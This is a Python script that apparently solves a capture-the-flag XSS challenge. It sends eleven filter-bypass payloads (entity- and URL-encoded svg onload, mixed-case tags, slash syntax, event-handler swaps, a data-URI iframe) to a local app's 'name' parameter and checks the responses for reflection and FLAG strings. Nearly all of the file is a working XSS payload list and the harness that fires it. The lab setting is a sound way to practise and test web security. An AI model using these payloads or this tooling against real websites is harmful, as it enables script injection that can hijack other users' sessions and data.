import requests
import urllib.parse
import re

# Base URL
base_url = "http://127.0.0.1:33203/page"

# XSS payload variations to test based on user's requirements
payloads = [
    # 1. HTML entity encoding: <svg onload=alert(&#39;XSS&#39;)>
    ("HTML entity encoding", "<svg onload=alert(&#39;XSS&#39;)>", "html_entity"),
    
    # 2. URL encoding for entire payload: %3Csvg%20onload%3Dalert(%27XSS%27)%3E
    ("URL encoded", "%3Csvg%20onload%3Dalert(%27XSS%27)%3E", "url_encoded"),
    
    # 3. Mixed case tags: <SVG ONLOAD=alert('XSS')>
    ("Mixed case tags", "<SVG ONLOAD=alert('XSS')>", "mixed_case"),
    
    # 4. Nested tags: <svg><svg onload=alert('XSS')>
    ("Nested tags", "<svg><svg onload=alert('XSS')>", "nested"),
    
    # 5. Different syntax: <svg/onload=alert('XSS')>
    ("Slash syntax", "<svg/onload=alert('XSS')>", "slash_syntax"),
    
    # 6. Whitespace variations: <svg onload = alert('XSS')>
    ("Whitespace before =", "<svg onload = alert('XSS')>", "whitespace_eq"),
    ("Multiple spaces", "<svg onload=     alert('XSS')>", "multi_space"),
    
    # 7. Event handler variations: <svg onmouseover=alert('XSS')>
    ("Onmouseover", "<svg onmouseover=alert('XSS')>", "onmouseover"),
    ("Onclick", "<svg onclick=alert('XSS')>", "onclick"),
    ("Onfocus", "<svg onfocus=alert('XSS')>", "onfocus"),
    
    # 8. Data URI: <iframe src="data:text/html,<script>alert('XSS')</script>">
    ("Data URI iframe", '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">', "data_uri"),
]

print("=" * 80)
print("[*] XSS Filter Bypass Testing")
print(f"[*] Target: {base_url}?name=[payload]")
print(f"[*] Testing {len(payloads)} different payload variations")
print("=" * 80)

results = []

for test_name, payload, technique in payloads:
    print(f"\n[+] Testing: {test_name}")
    print(f"    Payload: {payload}")
    
    try:
        # Send GET request with payload as 'name' parameter
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        # Check reflection status
        payload_reflected = payload in response.text
        decoded_reflected = urllib.parse.unquote(payload) in response.text
        
        # Check for exact alert('XSS') pattern
        has_exact_alert = "alert('XSS')" in response.text
        
        # Check for FLAG patterns
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        # Analyze response behavior
        response_length = len(response.content)
        status_code = response.status_code
        
        # Determine behavior based on response content
        behavior = "UNKNOWN"
        if 'Let the game begin' in response.text or 'new_star.png' in response.text:
            behavior = "FILTERED - Blocked by filter"
        elif 'Failed! Try again!' in response.text or 'error_star.png' in response.text:
            behavior = "ERROR - Bypassed filter but validation failed"
        elif flags:
            behavior = "SUCCESS - Flag found!"
        
        # Store results
        result = {
            'technique': technique,
            'test_name': test_name,
            'payload': payload,
            'status_code': status_code,
            'response_length': response_length,
            'payload_reflected': payload_reflected,
            'decoded_reflected': decoded_reflected,
            'has_exact_alert': has_exact_alert,
            'behavior': behavior,
            'flags': flags
        }
        results.append(result)
        
        # Print analysis
        print(f"    Status: {status_code} | Length: {response_length} bytes")
        print(f"    Payload reflected: {payload_reflected}")
        print(f"    Decoded reflected: {decoded_reflected}")
        print(f"    Exact alert('XSS') found: {has_exact_alert}")
        print(f"    Behavior: {behavior}")
        
        if flags:
            print(f"    [!!] FLAGS FOUND: {flags}")
        
    except Exception as e:
        print(f"    [ERROR] {str(e)}")
        results.append({
            'technique': technique,
            'test_name': test_name,
            'payload': payload,
            'error': str(e)
        })

# Summary analysis
print("\n" + "=" * 80)
print("[*] SUMMARY ANALYSIS")
print("=" * 80)

filtered = sum(1 for r in results if 'error' not in r and 'FILTERED' in r['behavior'])
errors = sum(1 for r in results if 'error' not in r and 'ERROR' in r['behavior'])
success = sum(1 for r in results if 'error' not in r and 'SUCCESS' in r['behavior'])
payload_reflected = sum(1 for r in results if 'error' not in r and r['payload_reflected'])
decoded_reflected = sum(1 for r in results if 'error' not in r and r['decoded_reflected'])

print(f"Total payloads tested: {len(results)}")
print(f"Filtered (blocked): {filtered}")
print(f"Validation errors (bypassed but failed): {errors}")
print(f"Success (potential flag): {success}")
print(f"Raw payload reflected: {payload_reflected}")
print(f"Decoded payload reflected: {decoded_reflected}")

# Show payloads that bypassed filter but failed validation
if errors > 0:
    print(f"\n[*] PAYLOADS THAT BYPASSED FILTER (but failed validation):")
    print("-" * 80)
    for r in results:
        if 'error' not in r and 'ERROR' in r['behavior']:
            print(f"\n[+] {r['test_name']}:")
            print(f"    Decoded reflected: {r['decoded_reflected']}")
            print(f"    Raw reflected: {r['payload_reflected']}")
            print(f"    Exact alert: {r['has_exact_alert']}")
            print(f"    Payload: {r['payload']}")

# Show any flags found
all_flags = [flag for r in results for flag in r.get('flags', [])]
if all_flags:
    print(f"\n[*] FLAGS FOUND:")
    print("=" * 80)
    for flag in all_flags:
        print(f"    {flag}")

print("\n[*] Testing complete")

